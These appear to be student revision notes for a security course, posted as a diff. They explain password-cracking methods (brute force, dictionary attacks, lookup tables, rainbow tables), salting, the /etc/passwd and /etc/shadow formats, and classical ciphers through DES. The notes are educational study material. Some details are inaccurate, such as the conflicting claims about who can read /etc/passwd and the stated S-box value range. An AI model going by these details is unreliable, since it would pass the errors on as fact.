+  <li>Look-up tables - precomputes the hash values of a large number of passwords.</li>
+  <li>Reverse Look-up tables - uses hash chains to reduce the storage space</li>
+  <li>Rainbow tables - an improvement on look-up tables as it reduces chain collisions</li>
+</ul>
+
+<p>We will go through each method</p>
+
+<h2 id="brute-force-and-dictionary-attacks">Brute Force and Dictionary Attacks</h2>
+
+<p>The simplest way to crack a hash, here are the steps/outline:</p>
+
+<ol>
+  <li>Guess password</li>
+  <li>Hash the guess</li>
+  <li>Check if the guess’ hash equals the given hash</li>
+  <li>If the hashes are equal, the guess is the password.</li>
+  <li>If not go back to step 1.</li>
+</ol>
+
+<p>As you can tell this is the slowest method but easiest to implement.</p>
+
+<h3 id="brute-force-attacks">Brute Force Attacks</h3>
+
+<ul>
+  <li>try every possible combination of characters</li>
+  <li>very computationally expensive, the least efficient</li>
+  <li>will eventually find the password after a long time (longer if passwords are more complex and longer)</li>
+</ul>
+
+<h3 id="dictionary-attacks">Dictionary attacks</h3>
+
+<ul>
+  <li>Uses a file containing words, phrases, common passwords, and other string that are likely to be used as a password</li>
+  <li>Theses dictionary files are constructed by extracting words from large bodies of text, and even from real databases of passwords.</li>
+  <li>Further processing is often applied to dictionary files, such as replacing words with their “leet speak: equivalents (hello = h3110)</li>
+</ul>
+
+<h2 id="lookup-tables">Lookup Tables</h2>
+
+<p>In Brute force/dictionary cracking a password is hashed every single time before being guessed.</p>
+
+<p>What look-up tables do is that it pre-computes the hashes of the passwords, store the hashes and the corresponding passwords in a look-up table.</p>
+
+<p>When given a hash, it looks up the table for the matching password - basically dictionary but precomputes hashes. More efficient.</p>
+
+<h2 id="reverse-lookup-tables">Reverse Lookup Tables</h2>
+
+<p>Problem with Dictionary Attack and Lookup Tables</p>
+
+<ul>
+  <li>Stores all password possibilities in a large database</li>
+  <li>Not efficient for long passwords (too much storage)</li>
+</ul>
+
+<p>What Reverse Lookup Tables do</p>
+
+<ul>
+  <li>sacrifice time for storage</li>
+  <li>works better for long passwords</li>
+</ul>
+
+<p>Does this using a technique called <strong>hash chain</strong>.</p>
+
+<h3 id="hash-chain">Hash Chain</h3>
+
+<p>Firstly, we have to define a <strong>reduction function</strong>, <strong><em>R</em></strong>, that maps hash values back into <strong>a</strong> password, <strong>not</strong> the original password (it isn’t an inverse of the hash function) but just some other password that fits a certain criteria.</p>
+
+<p>This criteria is that the password must belong to a domain in <strong><em>P</em></strong> where it is the set of all combinations of length <strong><em>L</em></strong> characters in a character set <strong><em>W</em></strong>. Example, if we want to crack all passwords of length 5, consisting of the characters from the character set [ABC…XYZ0123456789], then <strong><em>P</em></strong> is the set of all combinations of 5 characters from this character set.</p>
+
+<blockquote>
+  <p>The <strong>only requirement</strong> for reduction function is to return a value in P, other than that it can be anything.</p>
+</blockquote>
+
+<p>Let’s say our starting password is “random”. We hash it with the hash function that we are targeting, so MD5, SHA256, etc., then we reduce the hash with <strong><em>R</em></strong>. We do this as many times as we want (this is usually a calculated amount based on how long we expect/want to spend).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hash: "random"                           -&gt; "7ddf32e17a6ac5ce04a8ecbf782ca509"
+R:    "7ddf32e17a6ac5ce04a8ecbf782ca509" -&gt; "ienw3"
+Hash: "ienw3"                            -&gt; "b9322e367ad002d5adf7ca60b8b61e86"
+      ... (1000 times) ...
+Hash: "o1gti"                            -&gt; "27aa4cbd3653a4617e0aec76ba3af9a4"
+</code></pre></div></div>
+
+<h4 id="how-rlt-saves-space">How RLT saves space</h4>
+
+<p>Many passwords and hashes are generated in the hash chain, but because we have the R function and H function we <strong>only store</strong> the <em>start</em> and <em>end</em> passwords (lecture notes). Some sources online say that the start <strong>password</strong> and the end <strong>hash</strong> is stored.</p>
+
+<p>To use this table, lets say we have an input hash taken from a compromised user password database “b9322e367ad002d5adf7ca60b8b61e86”. If we stored the end hash, then what we can do is to first check if this password exists in the table – meaning we are extra lucky and we save loads of time.</p>
+
+<p>Otherwise, if it doesn’t exist or we use the system of storing end passwords (because the probability of finding the end hash immediately is very low) we do the following</p>
+
+<ol>
+  <li>Apply the <strong><em>R</em></strong> function on hashes and <strong><em>H</em></strong> function on passwords.</li>
+  <li>Check if the resultant password/hash (depending on which system you use) exists in the table.</li>
+  <li>Repeat from step 1 until a set limit <strong><em>N</em></strong> (i.e 1000) or until we find a <strong>match</strong>.</li>
+</ol>
+
+\[h-(R)\rightarrow p'1 -(H)\rightarrow h'1 -(R)\rightarrow p'2 -(H)\rightarrow \ldots\]
+
+<p>If at any point we observe a match:</p>
+
+<ul>
+  <li>We can get the corresponding start password (from the look-up table) and use it to recreate the chain</li>
+  <li>There is a good chance that the chain will contain the given hash <em>h</em></li>
+  <li>If so, the password immediately preceding <em>h</em> in the chain is the matching password</li>
+</ul>
+
+<h4 id="false-alarms">False Alarms</h4>
+
+<p>The reduction function we have defined does not represent a 1 to 1 relation between the hash and the password – 2 different hashes when going through the (<strong><em>R</em></strong>) may give the same output.</p>
+
+<blockquote>
+  <p>This is the <strong>main problem</strong> with RLT – hash chain collisions that we call false alarms.</p>
+</blockquote>
+
+<p><strong>Example.</strong> Both following chains contains p2; all info after p2 in both chains will be the same</p>
+
+<p>Chain 1: \(p1-&gt; h1 -&gt; p2 -&gt; h2 -&gt; p3 -&gt; h3 -&gt; p4\)</p>
+
+<p>Chain 2: \(p’1 -&gt; h’1 -&gt; p’2 -&gt; h’2 -&gt; p2 -&gt; h2 -&gt; p3\)</p>
+
+<p>Chain collision wastes space for the attacker</p>
+<ul>
+  <li>this is because after a certain $p_n$all following passwords in both chains will be the same</li>
+  <li>if this chain was in the 10,000, a majority will be the same (wastes space!)</li>
+</ul>
+
+<h2 id="rainbow-table">Rainbow Table</h2>
+
+<blockquote>
+  <p>Rainbow tables are designed to <strong>reduce</strong> chain collisions or false alarms. It does this by using <strong>different R functions</strong> in different reduction stages when generating the hash chain to reduce the probability of chain collisions.</p>
+</blockquote>
+
+<p>The collision between chain 1 and chain 2 is reduced.</p>
+
+<p>Chain 1: \(p1 -&gt; h1 –(R1)-&gt; p2 -&gt; h2 –(R2)-&gt; p3 -&gt; h3 –(R3)-&gt;p4\)</p>
+
+<p>Chain 2: \(p’1 -&gt; h’1 –(R1)-&gt; p’2 -&gt; h’2 –(R2)-&gt; p’’2 –&gt; h’’2 –(R3)-&gt; p’3\)</p>
+
+<h3 id="cracking-passwords-in-rainbow-table">Cracking passwords in Rainbow Table</h3>
+
+<p>Given a hash, $h$, the reduction functions must be applied in the right order when creating the chain.</p>
+
+<p>Lets say we have $k$ reduction functions, anyone of them can be applied first to the given hash.</p>
+
+<p>Assume $R_k$ is first applied to the given hash:</p>
+
+<p>The order of R functions applied is: \(h \;–(R_k)\rightarrow p’1 –(R_1)\rightarrow … –(R_2)\rightarrow, …, –(R_{k-1})\rightarrow …\)</p>
+
+<p>If password not found, means $R_k$ was not the first R function to be applied. Proceed to assume $R_{k−1} $is first applied.</p>
+
+\[R_{k-1}, R_k, R_1, …, R_{k-2}\]
+
+<p>If password not found, continue so on and so forth, until finally $R_1 $is first applied:</p>
+
+\[R_1, R_2, R_3, …, R_{k-1}, R_k\]
+
+<p>If the password still cannot be found after this, we say that the password of the given hash is not embedded in the rainbow table, and we are not able to find it.</p>
+
+<p><a href="https://www.royvanrijn.com/blog/2011/01/rainbow-tables/">Additional resources on reverse lookup tables and rainbow tables</a></p>
+
+<h2 id="defence">Defence</h2>
+
+<p>There is no way to prevent brute-force or dictionary attacks.</p>
+
+<p>But we can use <strong>password salts</strong> to make lookup table, reverse lookup and rainbow tables attacks less effective.</p>
+
+<h3 id="password-salt">Password Salt</h3>
+
+<blockquote>
+  <p>A salt is a randomly generated number. The salt and the password are connected and used by the hash function to generate hash:
+\(h = Hash(password+salt)\)
+<strong>Both</strong> <strong><em>h</em></strong> and the corresponding <strong>salt</strong> are stored in the password file.</p>
+</blockquote>
+
+<h4 id="login-verification">Login verification</h4>
+
+<p>When a user enters a password during the login</p>
+
+<ul>
+  <li>Obtain the <strong>salt</strong> value used to generate the hash for the user</li>
+  <li>Connect the input password with the <strong>salt</strong>​</li>
+  <li>Generate the hash of this input and compare it with the stored hash.</li>
+</ul>
+
+<h4 id="how-does-salting-help-defend-against-table-attacks">How does salting help defend against table attacks?</h4>
+
+<blockquote>
+  <p>In order for the lookup table attack to <strong>succeed</strong>, an attacker <strong>needs to precompute</strong> the tables.</p>
+</blockquote>
+
+<p>Since <strong>salt</strong> is used, we precompute and store the hash of a password for <strong>each possible</strong> <em>salt</em> value, which increases the possible combination of passwords + salts that we have to pre-compute in our lookup tables by <strong>a lot</strong>.</p>
+
+<p>Additionally because the <strong>salt</strong> is not user generated it is more <strong>unpredictable</strong> as well.</p>
+
+<p>For password p, precompute and store:
+\(Hash(p+salt_1), Hash(p+salt_2),..., Hash(p+salt_n)\)</p>
+<blockquote>
+  <p>When the <strong>salt</strong> is large (e.g. 48bits), the required storage space will be <strong>too big</strong> for the <strong>attack to be worthwhile</strong>.</p>
+
+  <p>In order to <strong>precompute</strong> reverse and rainbow tables, an attacker needs to <strong>generate many chains</strong> for the <strong>same password</strong> because it has to <strong>consider each possible <em>salt</em></strong>.</p>
+</blockquote>
+
+<h2 id="how-are-hashes-stored-in-linux">How are hashes stored in Linux?</h2>
+
+<blockquote>
+  <p><strong>TLDR.</strong> When a user is created their info is stored in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file and their hash + salt is stored in the <code class="language-plaintext highlighter-rouge">etc/shadow</code> file. Only the user can read <code class="language-plaintext highlighter-rouge">passwd</code> and only root can read <code class="language-plaintext highlighter-rouge">shadow</code>.</p>
+</blockquote>
+
+<p>It is likely that you won’t need the below information for your exam, they were from my notes mainly for the coursework but I thought I’d put it up anyways.</p>
+
+<p>When you create a new user in Linux, Linux creates an entry in the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> and the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> files:</p>
+
+<p><strong>Entry in <code class="language-plaintext highlighter-rouge">/etc/passwd</code></strong></p>
+
+<p>This file can be read by an user. The entry created in passwd file, it contains a number of fields which are separated by colon (:).</p>
+
+<p><img src="part3.assets/image-20201210213226777.png" alt="image-20201210213226777" /></p>
+
+<ol>
+  <li>Username - used when user logs in.</li>
+  <li>Meant for storing ha but hash is typically not stored in /etc/passwd, but in the file /etc/shadow. An <em>x</em> character indicates that the hash is stored in <code class="language-plaintext highlighter-rouge">/etc/shadow</code>.</li>
+  <li>User ID (UID) - UID 0 is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.</li>
+  <li>Group ID (GID) - The primary group ID (stored in <code class="language-plaintext highlighter-rouge">/etc/group</code> file)</li>
+  <li>General Info on User - The comment field. It allows you to add extra information about the users such as user’s full name, phone number etc. This field is used by <code class="language-plaintext highlighter-rouge">finger </code>command</li>
+  <li>Home directory - The absolute path to the directory the user will be in when they log in. If this directory does not exist then user’s directory becomes <code class="language-plaintext highlighter-rouge">/</code></li>
+  <li>Command/shell - The absolute path of a command or shell (<code class="language-plaintext highlighter-rouge">/bin/bash</code>). Typically, this is a shell. Please note that it does note have to be a shell. For e.g., <code class="language-plaintext highlighter-rouge">sysadmin</code> can use the <code class="language-plaintext highlighter-rouge">nologin</code> shell, which acts as a replacement shell for the user accounts. If shell is set to <code class="language-plaintext highlighter-rouge">/sbin/nologin</code> and the user tries to log in to the Linux system directly, the <code class="language-plaintext highlighter-rouge">/sbin/nologin</code> shell closes the connection.</li>
+</ol>
+
+<p><strong>Entry in <code class="language-plaintext highlighter-rouge">/etc/shadow</code></strong></p>
+
+<p>Shadow can only be read by root user. This is how the hash looks like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$6$JVGtK2Il$/s.5q4M1WN/ekw2rM26OHId9TPELOcPMmHG.E7zCzSbalzVPgPPGUIB7f7/2mTfj/Lg3RgoKhAkcsBDkJGAN.1:18554:0:99999:7:::
+</code></pre></div></div>
+
+<p>If the hash is a <code class="language-plaintext highlighter-rouge">*</code> - means that the account is disabled.</p>
+
+<p><code class="language-plaintext highlighter-rouge">!</code> or <code class="language-plaintext highlighter-rouge">!!</code> means that the account is locked</p>
+
+<p>A blank entry means that a password is not required to log in.</p>
+
+<p>The number between 1st 2 dollar signs represents the hash function used by the OS - here 6 represents SHA512.</p>
+
+<p>The characters between the 2nd and 3rd dollar sign is the <em>salt</em>.</p>
+
+<p>All the subsequent bits up till the colon (:) - is the generated <em>hash</em> for the password</p>
+
+<p>Last part (after the colon)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>:18554:0:99999:7:::
+</code></pre></div></div>
+
+<ol>
+  <li>The time the password was generated</li>
+  <li>The minimum number of days between authorised password changes. If we set it to be 0, password can be changed immediately. If we set it to 7, we have to use password for 7 days.</li>
+  <li>The maximum number of days a password can last for (compulsory to change after the set number of days)</li>
+  <li>The number of days in advance the system will give you a warning to change password</li>
+</ol>
+
+<h3 id="unix-password-protection">Unix password protection</h3>
+
+<p>Unix system may set the local rules for setting passwords.  For example, it can set the length that password must have, number of upper or lower cases, or even symbols.</p>
+
+<ul>
+  <li>Time before password can be changed or must be changed</li>
+  <li>Salt used (pseudo-random)</li>
+  <li>Type of Hash can be changed as well</li>
+</ul>
+
+<p>These are all ways Unix tries to protect passwords.</p>
+
+            <br/>
+            <hr style="
+                padding: 5px;
+                border-radius: 1em;
+                background-color: whitesmoke;
+            ">
+            <br/><h1 id="cryptography">Cryptography</h1>
+       
+            <h2 id="terminology">Terminology</h2>
+
+<ul>
+  <li>Plaintext, the original message</li>
+  <li>Ciphertext , the result of encrypting the message</li>
+  <li>Encryption/decryption , the process of transforming plaintext to ciphertext (or reverse)</li>
+</ul>
+
+<h2 id="different-types-of-encryption">Different types of encryption</h2>
+
+<p><strong>Secret key</strong>:</p>
+
+<ul>
+  <li>The key is a secret, only known to the communicating parties</li>
+  <li>The same key is used for encryption and decryption</li>
+</ul>
+
+<p><strong>Public key:</strong></p>
+
+<ul>
+  <li>Use a key to encrypt the message</li>
+  <li>This encryption key can be publicly  known</li>
+  <li>User another key to decrypt the message</li>
+  <li>The decryption key is kept private</li>
+  <li>Clever maths are used</li>
+</ul>
+
+<h2 id="encryption-technique-properties">Encryption Technique Properties</h2>
+
+<p>Good encryption techniques should have 4 properties</p>
+
+<ol>
+  <li>
+    <p>Confusion</p>
+
+    <ul>
+      <li>If we change a bit/a letter of they <strong>key</strong>, multiple parts of the ciphertext will change</li>
+      <li>hide the relationship between ciphertext and key</li>
+    </ul>
+  </li>
+  <li>
+    <p>Diffusion</p>
+
+    <ul>
+      <li>If we change a bit/a letter of the <strong>plaintext</strong>, then half of bits of the ciphertext should change</li>
+      <li>Spread the statistical structure of plaintext over multiple parts of the ciphertext</li>
+      <li>hide the relation between plaintext and ciphertext</li>
+    </ul>
+  </li>
+  <li>
+    <p>Cipher text is hard to break even with the most generous assumptions</p>
+
+    <ul>
+      <li>Know the encryption process - so no “security through obscurity”</li>
+      <li>know the initial settings (e.g. key length, block length)</li>
+      <li>as long as the key is secret the ciphertext is still secure</li>
+    </ul>
+  </li>
+  <li>
+    <p>Management of the encryption scheme must be feasible and cost-effective</p>
+
+    <ul>
+      <li>Long key may be very secure - but how can it be manged?</li>
+    </ul>
+  </li>
+</ol>
+
+<h2 id="secret-key-encryption">Secret key encryption</h2>
+
+<p>Also known as symmetric key, shared key, single key encryption.</p>
+
+<p>Modern “standard algorithm”:</p>
+
+<ul>
+  <li>First was the Data Encryption Standard (DES)</li>
+  <li>then the Advanced Encryption Standard (AES)</li>
+</ul>
+
+<p><strong>How it works.</strong></p>
+
+<ol>
+  <li>A secret key is shared by sender and receiver.</li>
+  <li>This secret key is used together with a known public algorithm (like AES)</li>
+  <li>The ciphertext is transmitted</li>
+  <li>The receivers decrypt the ciphertext with the known algorithm and the secret key to get plaintext.</li>
+</ol>
+
+<h2 id="techniques-of-encryption">Techniques of Encryption</h2>
+
+<p>There are many different encryption techniques, some better than others.</p>
+
+<h3 id="steganography">Steganography</h3>
+
+<blockquote>
+  <p>Steganography is a means of hiding an encrypted message.</p>
+
+  <ul>
+    <li>Often when an encrypted message is sent, it is suspicious because it is unreadable.</li>
+    <li>Steganography is used to hide the encrypted message in something unsuspicious.</li>
+  </ul>
+</blockquote>
+
+<p><strong>Steganographic Process</strong></p>
+
+<p><em>(cover medium) + (hidden data) + (stegano key) = stegano medium</em></p>
+
+<ul>
+  <li><strong>cover medium</strong>: the file in which we will hide the hidden_data</li>
+  <li><strong>hidden data</strong>: may be encrypted using stegano key or another key</li>
+  <li><strong>stegano medium</strong>: is the file we send.</li>
+</ul>
+
+<p>The <strong>cover medium</strong> (and thus <strong>stegano medium</strong>) are typically image or audio files.</p>
+
+<h4 id="hiding-data-in-an-image">Hiding data in an image</h4>
+
+<p>Images typically used either 8-bit or 24-bit colour</p>
+
+<p>Lets take 24-bit colour as an example:</p>
+
+<ul>
+  <li>Each pixel is represented by three bytes</li>
+  <li>Each of the three bytes representing the intensity of the three primary colours red, green, blue (RGB)</li>
+</ul>
+
+<p>Using Least Significant Bit (LSB) insertion - we can hide data in the image.</p>
+
+<h5 id="lsb-insertion">LSB Insertion</h5>
+
+<p>Uses binary representation of the <em>hidden_data</em> to overwrite the LSB of each byte in the <em>cover_image</em></p>
+
+<p>If we are using 24-bit colour, the amount of change will be minimal and indiscernible to the human eye.</p>
+
+<p><strong>Example.</strong></p>
+
+<p>Given three pixels:</p>
+
+<ol>
+  <li>10010101 00001101 11001001</li>
+  <li>10010110 00001111 11001010</li>
+  <li>1001111 00010000 11001011</li>
+</ol>
+
+<p>We can hide the 9 bits of data in the above three pixels:</p>
+
+<ol>
+  <li>1001010<strong>1</strong> 0000110<strong>0</strong> 1100100<strong>1</strong></li>
+  <li>1001011<strong>1</strong> 0000111<strong>0</strong> 1100101<strong>1</strong></li>
+  <li>1001111<strong>1</strong> 0001000<strong>0</strong> 1100101<strong>1</strong></li>
+</ol>
+
+<p>Hidden message is: <strong>101101101</strong></p>
+
+<h3 id="code-words">Code Words</h3>
+
+<p>Define code for each vocabulary in a code book which is like a dictionary. You lookup the dictionary to decipher the code word.</p>
+
+<h3 id="transpositionpermutation-cipher">Transposition/Permutation Cipher</h3>
+
+<p><strong><em>Confusion</em></strong></p>
+
+<p>Re-arrange plaintext into columns/rows of a fixed length and then send the message read the other way</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">Plaintext</span><span class="pi">:</span>  <span class="s">HISECRETMESSAGE</span>
+<span class="na">Rearrange</span><span class="pi">:</span>  <span class="s">H E E E A</span>
+            <span class="s">I C T S G</span>
+            <span class="s">S R M S E</span>
+<span class="na">Ciphertext</span><span class="pi">:</span> <span class="s">HEEEAICTSGSRMSE</span>
+</code></pre></div></div>
+
+<p>Letters are the same, but in a different order. The <strong>shared secret</strong> is knowing what permutation is carried out. This rearrangement can be done any number of times.</p>
+
+<p>A more <strong>confusing</strong> version of this is double transposition, where your rearranged plaintext uses a code word and a number to decide how the text should be rearranged further. In the example below, we have rearrange the grid of letters from the first round according to the numbers specified (if there are not enough letters in the column to fill the row, you just continue with the next column).</p>
+
+<pre><code class="language-YAML">Codeword: C A K E S         C A K E S
+Number:   2 5 1 4 3         2 5 1 4 3
+          H E E E A ------&gt; E T M H I
+          I C T S G         S A G E E
+          S R M S E         S S E C R
+</code></pre>
+
+<h3 id="monoalphabetic-substitution-cipher">Monoalphabetic Substitution Cipher</h3>
+
+<p><strong><em>Confusion</em></strong></p>
+
+<p>If you are familiar with the caesar cipher – this is it. Basically have a ciphertext alphabet, where each symbol maps to the normal alphabet.</p>
+
+<blockquote>
+  <p><strong>Not the best</strong> technique because there is a <strong>linear relation</strong> between the letters/symbols and attackers can easily figure out the encryption key.</p>
+</blockquote>
+
+<p><em>Supposed A … Z = 0 … 25, then y = x + a mod 26 (a is the encryption key)</em></p>
+
+<p><strong>Another way</strong> is to use a keyword e.g. “zebras”</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">Plaintext alphabet</span><span class="pi">:</span>  <span class="s">ABCDEFGHIJKLMNOPQRSTUVWXYZ</span>
+<span class="na">Ciphertext alphabet</span><span class="pi">:</span> <span class="s">ZEBRASCDFGHIJKLMNOPQTUVWXY</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Disadvantage.</strong> There is no “linear relation” but a long ciphertext can be easily cracked by <strong>frequency analysis</strong>.</p>
+</blockquote>
+
+<p><strong>Frequency analysis</strong> relies on the fact that some letters are used more than others. By counting the letter frequency of a certain symbol in the ciphertext, someone can make an intelligent guess on which letter in the alphabet it represents.</p>
+
+<p>To prevent this, multiple ciphertext alphabets are used…</p>
+
+<h3 id="polyalphabetic-substitution-cipher">Polyalphabetic Substitution Cipher</h3>
+
+<p><strong><em>Confusion</em></strong></p>
+
+<p>A key is used to decide which ciphertext alphabet is applied in each substitution. An example is the Vigenere cipher. Here is table that works together with the vignere cipher.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>A</th>
+      <th>B</th>
+      <th>…</th>
+      <th>Y</th>
+      <th>Z</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>A</strong></td>
+      <td>A</td>
+      <td>B</td>
+      <td>…</td>
+      <td>Y</td>
+      <td>Z</td>
+    </tr>
+    <tr>
+      <td><strong>B</strong></td>
+      <td>B</td>
+      <td>C</td>
+      <td>…</td>
+      <td>Z</td>
+      <td>A</td>
+    </tr>
+    <tr>
+      <td><strong>…</strong></td>
+      <td>…</td>
+      <td>…</td>
+      <td>…</td>
+      <td>…</td>
+      <td>…</td>
+    </tr>
+    <tr>
+      <td><strong>Y</strong></td>
+      <td>Y</td>
+      <td>Z</td>
+      <td>…</td>
+      <td>W</td>
+      <td>X</td>
+    </tr>
+    <tr>
+      <td><strong>Z</strong></td>
+      <td>Z</td>
+      <td>A</td>
+      <td>…</td>
+      <td>X</td>
+      <td>Y</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Using this table, and a secret key: <strong>abattis</strong> – we check the cell that corresponds to the pair (Plaintext_letter)(Key_symbol) = Ciphertext Symbol</p>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">Plaintext</span><span class="pi">:</span>  <span class="s">EXAMPLE</span>
+<span class="na">Keystream</span><span class="pi">:</span>  <span class="s">abattis</span>
+<span class="na">Ciphertext</span><span class="pi">:</span> <span class="s">EYAFITW</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p><strong>Disadvantage.</strong> Still has the same statistical flaw for the letters that use the same key alphabet. This can be mitigated by using a longer keyword and is the most secure (in theory) if the key is the same length as the plaintext.</p>
+</blockquote>
+
+<h3 id="one-time-pad">One time pad</h3>
+
+<p>This is where each letter in the message is encrypted with a different alphabet set. This is as secure as you can get but the <strong>problem</strong> lies with how the key is <strong>shared</strong> as both parties have to know the key which is as long as the plaintext.</p>
+
+<blockquote>
+  <p><strong>Disadvantage.</strong> As a result, one time pad is not a practical solution because of key generation, key distribution, key protection.</p>
+</blockquote>
+
+<h3 id="combining-message-and-key">Combining message and key</h3>
+
+<p>In a computer, <strong>plaintext</strong> and the <strong>key</strong> are an arrangement of bits. The best way to combine them is to use bitwise <strong>XOR</strong>.</p>
+
+<ul>
+  <li>Bitwise operations are not as computationally expensive as addition operations. (If you study 132, 1 just needs a logic gate, the other needs an entire adder/subtractor).</li>
+  <li><strong>AND</strong> and <strong>OR</strong> are not good as they do not produce unique encryption – so they are not good for decryption.</li>
+</ul>
+
+<p><strong>XOR</strong> on the other hand produces a unique encryption - using XOR, ciphertext can be decrypted by performing XOR over ciphertext and key. So it is very easy to encrypt and to decrypt, you just need the <strong>key</strong>.</p>
+
+<h2 id="data-encryption-standard-des">Data Encryption Standard (DES)</h2>
+
+<p><em>The first standardised encryption method. Is based on the Feistal approach.</em></p>
+
+<ul>
+  <li>Uses block cipher: 64-bit plaintext block size.</li>
+  <li>Uses a 56-bit secret key (technically 64-bit, but the 8th bit of each 8-bits are parity bits which are dropped after the permutated choice 1)</li>
+  <li>Goes through 16 rounds of encryption operations per block</li>
+  <li>Uses substitution (confusion)</li>
+  <li>Uses permutation (diffusion)</li>
+  <li>Encryption operations are all public - but it is still hard to crack because the <strong>secret key</strong> is safe.</li>
+</ul>
+
+<blockquote>
+  <p><strong>Block Cipher.</strong> Encrypts blocks of data one a time (DES)</p>
+
+  <p><strong>Stream Cipher.</strong> Encrypts each input element (bit or byte etc.) one at a time, producing the machine output element as the process goes along.</p>
+</blockquote>
+
+<h3 id="fiestal-approach-overview">Fiestal Approach Overview</h3>
+
+<figure align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Feistel_cipher_diagram_en.svg" style="width:328px;height:480px;" class="center" />
+        <figcaption style="text-align:center;">Fiestal Cipher Diagram, <a href="https://commons.wikimedia.org/wiki/File:Feistel_cipher_diagram_en.svg">Wikimedia Commons</a></figcaption>
+</figure>
+
+<ol>
+  <li>Plaintext block is split into two equal parts (L<sub>0</sub> and R<sub>0</sub>), each of 32 bits.</li>
+  <li>Run one side of  (i.e R<sub>0</sub>) through a “feistal” function that is fed a key, K<sub>0</sub>.</li>
+  <li>The output of the function, R<sub>0</sub>K<sub>0</sub>, is <strong>XORed</strong> with the other half (L<sub>0</sub>).</li>
+  <li>The output of this <strong>XOR</strong> is used as the input for the round function of the <strong>next round</strong>, while the initial R<sub>0</sub> will be <strong>XORed</strong> with this 2nd round function output.</li>
+  <li>This continues for a total of 16 rounds, where the final blocks are the ciphertext.</li>
+</ol>
+
+<blockquote>
+  <p>A characteristic of all <strong>Feistal ciphers</strong> is that the process for <strong>decryption</strong> follows the exact same steps as encryption – <strong>only thing</strong> is that the round keys need to be used in the reverse order.</p>
+</blockquote>
+
+<p>Each round this is computed:
+\(L_{i+1} = R_i, \; R_{i+1} = L_i \oplus F(R_i,K_i)\)</p>
+
+<h3 id="the-round-function">The Round Function</h3>
+
+<p>There are 4 operations in the function</p>
+
+<ol>
+  <li><strong>Expansion</strong>
+    <ul>
+      <li>32 bits half-block is expanded to 48 bits by duplicating half of the bits
+        <ul>
+          <li>32 bits organised into 8 pieces each with 4 bits</li>
+          <li>Duplicate the first and fourth bit in each piece</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><strong>Key Combination</strong>
+    <ul>
+      <li>The output of the expansion is <strong>XORed</strong> with the current round key, K<sub>i</sub></li>
+    </ul>
+  </li>
+  <li><strong>Substitution</strong>
+    <ul>
+      <li>The result of the <strong>XOR</strong> is broken into 8 6-bit pieces and each is passed through a unique substitution box or S-Box</li>
+      <li>This uses the vectorial boolean function to convert 6-bit input to a 4-bit output
+        <ul>
+          <li>There is a lookup table to store the mapping from 6-bit input to 4-bit output</li>
+          <li>E.g. <strong>1</strong>0110<strong>0</strong>. The bits in bold is the row name and the bits in between is the column. The cells in the lookup table specify the final substitution value that becomes the output. Refer to the table below.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><strong>Permutation</strong>
+    <ul>
+      <li>The result of that is passed through a permutation function P (diffusion)</li>
+    </ul>
+  </li>
+</ol>
+
+<p>In each row, the lookup table cell values will are unique – meaning row-wise the values are from 0-16 (because 2<sup>4</sup> bits) but is not in order.</p>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th>-0000-</th>
+      <th>…</th>
+      <th>-1111-</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>0xxxx0</td>
+      <td>14</td>
+      <td>…</td>
+      <td>7</td>
+    </tr>
+    <tr>
+      <td>0xxxx1</td>
+      <td>0</td>
+      <td>…</td>
+      <td>8</td>
+    </tr>
+    <tr>
+      <td>1xxxx0</td>
+      <td>4</td>
+      <td>…</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>1xxxx1</td>
+      <td>15</td>
+      <td>…</td>
+      <td>13</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="subkey-generation-key-schedule">Subkey Generation (Key Schedule)</h3>
+
+<p>We said that the DES takes 1 64-bit key, but from the <a href="#fiestal-approach-overview">Feistal Diagram</a> above we see that each round function takes a different key – this is because subkeys are generated with permutation functions.</p>
+
+<figure align="center">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/06/DES-key-schedule.png" class="center" />
+        <figcaption style="text-align:center;">DES key schedule, <a href="https://commons.wikimedia.org/wiki/File:DES-key-schedule.png">Wikimedia Commons</a></figcaption>
+</figure>
+
+<h4 id="permuted-choice-1">Permuted Choice 1</h4>
+
+<p>This function has 2 purposes:</p>
+
+<ol>
+  <li>To drop the 8th bit of each of the eight 8-bit blocks, as they are the parity bits</li>
+  <li>Permute the remaining bits (56)</li>
+</ol>
+
+<p>After PC1 is done, the generation of the DES round keys (keys for each round function): In each round</p>
+
+<ol>
+  <li>The key is split into two 28-bit halves.</li>
+  <li>Each half is shifted left by a set amount that may vary per round but will always be the same for encryption or decryption.</li>
+  <li>The shifted halves are permuted with PC2 – shuffle and select 48-bits from 56-bits (28 × 2)</li>
+  <li>The shifted halves are also transferred to the next round where they are shifted again (the shifts are cumulative).</li>
+</ol>
+
+<h4 id="permuted-choice-2">Permuted Choice 2</h4>
+
+<p>As mentioned above, the algorithm takes a 56-bit subkey as input and produces a 48-bit round key for each round function.</p>
+
+<blockquote class="extra">
+    <b>FYI.</b> Each bit of the initial 56-bit key is used in an average of 14 of 16 round keys.
+</blockquote>
+
+<h2 id="advanced-encryption-standard-aes">Advanced Encryption Standard (AES)</h2>
+
